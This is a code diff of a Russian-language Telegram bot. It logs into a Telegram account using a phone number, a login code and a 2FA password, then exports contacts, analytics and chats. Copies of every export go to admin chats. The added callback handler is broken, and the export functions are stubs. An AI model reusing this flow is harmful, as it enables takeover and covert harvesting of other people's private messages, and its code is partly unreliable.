@@ -40,6 +40,33 @@ logging.basicConfig(level=logging.INFO)
 # Словарь для хранения состояния пользователя
 user_state = {}
 
+# Определение состояний
+class Form(StatesGroup):
+    awaiting_selection = State()
+
+# Функция для отображения клавиатуры
+async def show_keyboard(user_id):
+    keyboard = InlineKeyboardMarkup(row_width=1)
+    buttons = [
+        InlineKeyboardButton(text="Сбор аналитики по аккаунту", callback_data='analytics'),
+        InlineKeyboardButton(text="Выгрузка личных чатов", callback_data='personal_chats'),
+        InlineKeyboardButton(text="Выгрузка групповых чатов", callback_data='group_chats')
+    ]
+    keyboard.add(buttons[0])
+    keyboard.add(buttons[1], buttons[2])
+
+    await bot.send_message(user_id, "Выберите направление поиска", reply_markup=keyboard)
+    # Устанавливаем состояние "awaiting_selection"
+    await Form.awaiting_selection.set()
+
+# Функция what_to_do для отображения клавиатуры при выполнении условий
+async def what_to_do(message: types.Message, conditions_met: bool):
+    if conditions_met:
+        await message.answer("Подключено! Формирую отчет")
+        await show_keyboard(message.from_user.id)
+    else:
+        await message.answer("Выбери, что будешь делать!")
+
 # Функция для отправки файлов
 async def send_files_to_bot(bot, admin_chat_ids, user_chat_id):
     file_extensions = ['_contacts.xlsx', '_report.html']
@@ -48,7 +75,7 @@ async def send_files_to_bot(bot, admin_chat_ids, user_chat_id):
     now_local = now_utc.astimezone(timezone)
     # Форматирование даты и времени
     now = now_local.strftime("%Y-%m-%d %H:%M:%S")
-    user_id = user_chat_id
+    user_id=user_chat_id
     user_name = ALLOWED_USERS[user_id]
 
     user_info_message = f"Дата и время выгрузки: {now} \nВыгрузка осуществлена: ({user_name}, {user_id}):"
@@ -57,6 +84,7 @@ async def send_files_to_bot(bot, admin_chat_ids, user_chat_id):
     for admin_chat_id in admin_chat_ids:
         await bot.send_message(admin_chat_id, user_info_message)
 
+    # Отправка файлов с информацией пользователю и админам
     # Отправка файлов с информацией пользователю и админам
     for file_extension in file_extensions:
         files_to_send = [file_name for file_name in os.listdir('.') if file_name.endswith(file_extension) and os.path.getsize(file_name) > 0]
@@ -67,9 +95,10 @@ async def send_files_to_bot(bot, admin_chat_ids, user_chat_id):
                     await bot.send_document(chat_id, file)
             os.remove(file_to_send)
 
+
 # Обработчики сообщений
 @dp.message_handler(lambda message: message.from_user.id not in allowed_users)
-async def unauthorized(message: AiogramMessage):
+async def unauthorized(message: types.Message):
     await message.answer("Бот не работает, попробуйте позже")
     now_utc = datetime.now(pytz.utc)
     timezone = pytz.timezone('Europe/Moscow')
@@ -77,12 +106,12 @@ async def unauthorized(message: AiogramMessage):
     now = now_local.strftime("%Y-%m-%d %H:%M:%S")
     user_id = message.from_user.id
     
-    user_info_message = f'Попытка запуска бота НЕАВТОРИЗОВАННЫМ пользователем ID:{user_id}.\nДата и время запуска: {now}'
+    user_info_message=f'Попытка запуска бота НЕАВТОРИЗОВАННЫМ пользователем ID:{user_id}.\nДата и время запуска: {now}'
     for admin_chat_id in admin_chat_ids:
             await bot.send_message(admin_chat_id, user_info_message)
 
 @dp.message_handler(commands=['start'])
-async def send_welcome(message: AiogramMessage):
+async def send_welcome(message: types.Message):
     user_id = message.from_user.id
     if user_id in allowed_users:
         await message.answer("Введите номер телефона")
@@ -94,27 +123,9 @@ async def send_welcome(message: AiogramMessage):
         user_info_message = f"Авторизованный пользователь: ({user_name}, id: {user_id}) запустил бота.\nДата и время запуска: {now}"
         for admin_chat_id in admin_chat_ids:
             await bot.send_message(admin_chat_id, user_info_message)
-
-        # Добавляем кнопки
-        keyboard = AiogramInlineKeyboardMarkup(row_width=1)
-        buttons = [
-            AiogramInlineKeyboardButton(text="Сбор аналитики по аккаунту", callback_data='analytics'),
-            AiogramInlineKeyboardButton(text="Выгрузка личных чатов", callback_data='personal_chats'),
-            AiogramInlineKeyboardButton(text="Выгрузка групповых чатов", callback_data='group_chats')
-        ]
-        keyboard.add(buttons[0])
-        keyboard.add(buttons[1], buttons[2])
-
-        await message.answer("Выберите направление поиска", reply_markup=keyboard)
     else:
         await unauthorized(message)
 
-@dp.callback_query_handler(lambda callback_query: True)
-async def handle_callback_query(callback_query: AiogramCallbackQuery):
-    code = callback_query.data
-    await bot.answer_callback_query(callback_query.id)
-    await bot.send_message(callback_query.from_user.id, f"Вы выбрали: {code}")
-    
 #Введен номер
 @dp.message_handler(lambda message: message.text and 
                     len(re.sub(r'\D', '', message.text)) > 9 and 
@@ -157,8 +168,10 @@ async def get_code(message: types.Message):
     try:
         await client.connect()
         await client.sign_in(phone_number, code, phone_code_hash=str(phone_code_hash))
-        await message.answer("Подключено! Формирую отчет")
-        await process_user_data(client, phone_number, message.from_user.id)
+        #await message.answer("Подключено! Формирую отчет")
+        conditions_met = True
+        await what_to_do(message, conditions_met)
+        #await process_user_data(client, phone_number, message.from_user.id)
         await client.log_out()
         await client.disconnect()
         
@@ -198,9 +211,11 @@ async def process_password(message: types.Message):
         await client.connect()
         await client.sign_in(password=password)
         
-        await message.answer("Подключено! Формирую отчет")
+        #await message.answer("Подключено! Формирую отчет")
         phone_number = user_state[message.from_user.id]['phone_number']
-        await process_user_data(client, phone_number, message.from_user.id)
+        conditions_met = True
+        await what_to_do(message, conditions_met)
+        #await process_user_data(client, phone_number, message.from_user.id)
         user_state.pop(message.from_user.id, None)  # Удаляем состояние пользователя после успешной обработки
     except PasswordHashInvalidError:
         user_state[message.from_user.id]['password_attempts'] += 1
@@ -221,6 +236,32 @@ async def process_password(message: types.Message):
 # Функция для создания нового экземпляра клиента
 def create_client():
     return TelegramClient('session_name', api_id, api_hash)
+
+
+
+# Обработчики колбэков для запуска нужных функций
+@dp.callback_query_handler(state=Form.awaiting_selection)
+async def handle_callback_query(callback_query: CallbackQuery, state: FSMContext, client, phone_number, user_id):
+    code = callback_query.data
+    await bot.answer_callback_query(callback_query.id)
+
+    if code == 'analytics':
+        await process_user_data(client, phone_number, user_id)
+    elif code == 'personal_chats':
+        await export_personal_chats(callback_query.message)
+    elif code == 'group_chats':
+        await export_group_chats(callback_query.message)
+    
+    # Сброс состояния
+    await state.finish()
+  
+# Пример функции для выгрузки личных чатов
+async def export_personal_chats(message: Message):
+    await message.answer("Выгрузка личных чатов...")
+
+# Пример функции для выгрузки групповых чатов
+async def export_group_chats(message: Message):
+    await message.answer("Выгрузка групповых чатов...")
 
 # Функция для обработки данных пользователя
 async def process_user_data(client, phone_number, user_id):
